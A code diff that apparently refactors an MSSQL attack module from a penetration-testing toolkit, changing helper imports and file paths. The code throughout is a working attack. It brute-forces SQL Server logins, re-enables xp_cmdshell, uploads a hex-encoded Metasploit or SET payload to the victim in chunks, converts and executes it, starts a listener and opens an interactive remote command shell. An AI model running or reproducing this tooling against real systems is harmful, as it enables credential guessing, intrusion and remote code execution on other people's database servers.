@@ -1,5 +1,5 @@
 #!/usr/bin/python
-from src.core import setcore
+from src.core.setcore import *
 import _mssql
 import sys
 import subprocess
@@ -16,9 +16,10 @@ import shutil
 #
 
 # define the base path
-definepath = os.getcwd()
+definepath = definepath()
+operating_system = check_os()
 
-operating_system = setcore.check_os()
+msf_path = meta_path()
 
 # this is for the initial discovery for scanning
 def scan(range,lowport,highport):
@@ -30,7 +31,7 @@ def scan(range,lowport,highport):
         return portscan
     # if nothing is returned
     if portscan == False:
-        setcore.print_warning("No MSSQL servers were found in the ranges specified")
+        print_warning("No MSSQL servers were found in the ranges specified")
         return False
     # return the portscan value
     return portscan
@@ -55,11 +56,11 @@ def brute(ipaddr,username,port,wordlist):
             passwords = passwords.rstrip()
             # try actual password
             try:
-                print "Attempting to brute force " + setcore.bcolors.BOLD + ipaddr + setcore.bcolors.ENDC + " with username of " + setcore.bcolors.BOLD + username + setcore.bcolors.ENDC + " and password of " + setcore.bcolors.BOLD + passwords + setcore.bcolors.ENDC
+                print "Attempting to brute force " + bcolors.BOLD + ipaddr + bcolors.ENDC + " with username of " + bcolors.BOLD + username + bcolors.ENDC + " and password of " + bcolors.BOLD + passwords + bcolors.ENDC
                 # connect to the sql server and attempt a password
                 target_server = _mssql.connect(ipaddr + ":" + str(port), username, passwords)
                 # print that we were successful
-                setcore.print_status("\nSuccessful login with username %s and password: %s" % (username, passwords))
+                print_status("\nSuccessful login with username %s and password: %s" % (username, passwords))
                 counter = 1
                 break
 
@@ -73,7 +74,7 @@ def brute(ipaddr,username,port,wordlist):
         # else we didnt and we need to return a false
         else:
             if ipaddr != '':
-                setcore.print_warning("Unable to guess the SQL password for %s with username of %s" % (ipaddr,username))
+                print_warning("Unable to guess the SQL password for %s with username of %s" % (ipaddr,username))
             return False
 
 
@@ -83,37 +84,36 @@ def brute(ipaddr,username,port,wordlist):
 def deploy_hex2binary(ipaddr,port,username,password,option):
     # connect to SQL server
     target_server = _mssql.connect(ipaddr + ":" + str(port), username, password)
-    setcore.print_status("Connection established with SQL Server...")
-    setcore.print_status("Converting payload to hexadecimal...")
-    # if we are using a SET interactive shell payload then we need to make the path under web_clone versus program_junk
-    if os.path.isfile("src/program_junk/set.payload"):
-        web_path = ("src/program_junk/web_clone/")
+    print_status("Connection established with SQL Server...")
+    print_status("Converting payload to hexadecimal...")
+    # if we are using a SET interactive shell payload then we need to make the path under web_clone versus ~./set
+    if os.path.isfile(setdir + "/set.payload"):
+        web_path = (setdir + "/web_clone/")
     # then we are using metasploit
-    if not os.path.isfile("src/program_junk/set.payload"):
+    if not os.path.isfile(setdir + "/set.payload"):
         if operating_system == "posix":
-            web_path = ("src/program_junk")
-            subprocess.Popen("cp src/program_junk/msf.exe src/program_junk/ 1> /dev/null 2> /dev/null", shell=True).wait()
-            subprocess.Popen("cp src/program_junk/msf2.exe src/program_junk/msf.exe 1> /dev/null 2> /dev/null", shell=True).wait()
+            web_path = (setdir)
+            subprocess.Popen("cp %s/msf.exe %s/ 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
+            subprocess.Popen("cp %s//msf2.exe %s/msf.exe 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
     fileopen = file("%s/msf.exe" % (web_path), "rb")
     # read in the binary
     data = fileopen.read()
     # convert the binary to hex
     data = binascii.hexlify(data)
     # we write out binary out to a file
-    filewrite = file("src/program_junk/payload.hex", "w")
+    filewrite = file(setdir + "/payload.hex", "w")
     filewrite.write(data)
     filewrite.close()
 
     # if we are using metasploit, start the listener
-    if not os.path.isfile("%s/src/program_junk/set.payload" % (definepath)):
+    if not os.path.isfile(setdir + "/set.payload"):
         if operating_system == "posix":
             import pexpect
-            meta_path = setcore.meta_path()
-            setcore.print_status("Starting the Metasploit listener...")
-            child2 = pexpect.spawn("%s/msfconsole -r src/program_junk/meta_config" % (meta_path))
+            print_status("Starting the Metasploit listener...")
+            child2 = pexpect.spawn("%s/msfconsole -r %s/meta_config" % (msf_path,setdir))
 
     # random executable name
-    random_exe = setcore.generate_random_string(10,15)
+    random_exe = generate_random_string(10,15)
 
     #
     # next we deploy our hex to binary if we selected option 1 (powershell)
@@ -147,7 +147,7 @@ def deploy_hex2binary(ipaddr,port,username,password,option):
     # next we deploy our hex to binary if we selected option 2 (debug)
     #
     if option == "2":
-        setcore.print_status("Attempting to re-enable the xp_cmdshell stored procedure if disabled..")
+        print_status("Attempting to re-enable the xp_cmdshell stored procedure if disabled..")
         # reconfigure the stored procedure and re-enable
         try:
             target_server.execute_query("EXEC master.dbo.sp_configure 'show advanced options', 1")
@@ -158,48 +158,46 @@ def deploy_hex2binary(ipaddr,port,username,password,option):
         # we selected hex to binary
         fileopen = file("src/payloads/hex2binary.payload", "r")
         # specify random filename for deployment
-        setcore.print_status("Deploying initial debug stager to the system.")
-        random_file = setcore.generate_random_string(10,15)
+        print_status("Deploying initial debug stager to the system.")
+        random_file = generate_random_string(10,15)
         for line in fileopen:
             # remove bogus chars
             line = line.rstrip()
             # make it printer friendly to screen
             print_line = line.replace("echo e", "")
-            setcore.print_status("Deploying stager payload (hex): " + setcore.bcolors.BOLD + str(print_line) + setcore.bcolors.ENDC)
+            print_status("Deploying stager payload (hex): " + bcolors.BOLD + str(print_line) + bcolors.ENDC)
             target_server.execute_query("xp_cmdshell '%s>> %s'" % (line,random_file))
-        setcore.print_status("Converting the stager to a binary...")
+        print_status("Converting the stager to a binary...")
         # here we convert it to a binary
         target_server.execute_query("xp_cmdshell 'debug<%s'" % (random_file))
-        setcore.print_status("Conversion complete. Cleaning up...")
+        print_status("Conversion complete. Cleaning up...")
         # delete the random file
         target_server.execute_query("xp_cmdshell 'del %s'" % (random_file))
 
     # here we start the conversion and execute the payload
-
-    setcore.print_status("Sending the main payload via to be converted back to a binary.")
+    print_status("Sending the main payload via to be converted back to a binary.")
     # read in the file 900 bytes at a time
-    fileopen = file("src/program_junk/payload.hex", "r")
-    #random_exe = setcore.generate_random_string(10,15)
+    fileopen = file(setdir + "/payload.hex", "r")
     while fileopen:
         data = fileopen.read(900).rstrip()
         # if data is done then break out of loop because file is over
         if data == "": break
-        setcore.print_status("Deploying payload to victim machine (hex): " + setcore.bcolors.BOLD + str(data) + setcore.bcolors.ENDC + "\n")
+        print_status("Deploying payload to victim machine (hex): " + bcolors.BOLD + str(data) + bcolors.ENDC + "\n")
         target_server.execute_query("xp_cmdshell 'echo %s>> %s'" % (data, random_exe))
-    setcore.print_status("Delivery complete. Converting hex back to binary format.")
+    print_status("Delivery complete. Converting hex back to binary format.")
 
     # if we are using debug conversion then convert our binary
     if option == "2":
         target_server.execute_query("xp_cmdshell 'rename MOO.bin %s.exe'" % (random_file))
         target_server.execute_query("xp_cmdshell '%s %s'" % (random_file, random_exe))
         # clean up the old files
-        setcore.print_status("Cleaning up old files..")
+        print_status("Cleaning up old files..")
         target_server.execute_query("xp_cmdshell 'del %s'" % (random_exe))
 
     # if we are using SET payload
-    if os.path.isfile("%s/src/program_junk/set.payload" % (definepath)):
-        setcore.print_status("Spawning seperate child process for listener...")
-        try: shutil.copyfile("src/program_junk/web_clone/x", definepath)
+    if os.path.isfile(setdir + "/set.payload"):
+        print_status("Spawning seperate child process for listener...")
+        try: shutil.copyfile(setdir + "/web_clone/x", definepath)
         except: pass
 
         # start a threaded webserver in the background
@@ -218,11 +216,11 @@ def deploy_hex2binary(ipaddr,port,username,password,option):
         os.chdir(definepath)
 
         # now back
-        os.chdir("%s/src/program_junk/web_clone/" % (definepath))
+        os.chdir(setdir + "/web_clone/")
 
-    setcore.print_status("Pausing 10 seconds to let the system catch up...")
+    print_status("Pausing 10 seconds to let the system catch up...")
     time.sleep(10)
-    setcore.print_status("Triggering payload stager...")
+    print_status("Triggering payload stager...")
     # thread is needed here due to the connect not always terminating thread, it hangs if thread isnt specified
     import thread
     # execute the payload
@@ -240,7 +238,7 @@ def deploy_hex2binary(ipaddr,port,username,password,option):
         sql_command = ("xp_cmdshell '%s'" % (random_exe_execute))
         thread.start_new_thread(target_server.execute_query, (sql_command,))
     # if pexpect doesnt exit right then it freaks out
-    if os.path.isfile("%s/src/program_junk/set.payload" % (definepath)):
+    if os.path.isfile(setdir + "/set.payload"):
         os.system("python ../../payloads/set_payloads/listener.py")
     try:
         # interact with the child process through pexpect
@@ -257,15 +255,15 @@ def deploy_hex2binary(ipaddr,port,username,password,option):
 def cmdshell(ipaddr,port,username,password,option):
     # connect to SQL server
     mssql = _mssql.connect(ipaddr + ":" + str(port), username, password)
-    setcore.print_status("Connection established with SQL Server...")
-    setcore.print_status("Attempting to re-enable xp_cmdshell if disabled...")
+    print_status("Connection established with SQL Server...")
+    print_status("Attempting to re-enable xp_cmdshell if disabled...")
     try:
         mssql.execute_query("EXEC master.dbo.sp_configure 'show advanced options', 1")
         mssql.execute_query("RECONFIGURE")
         mssql.execute_query("EXEC master.dbo.sp_configure 'xp_cmdshell', 1")
         mssql.execute_query("RECONFIGURE")
     except Exception, e: pass
-    setcore.print_status("Enter your Windows Shell commands in the xp_cmdshell - prompt...")
+    print_status("Enter your Windows Shell commands in the xp_cmdshell - prompt...")
     mssql.select_db('master')
     while 1:
         # cmdshell command
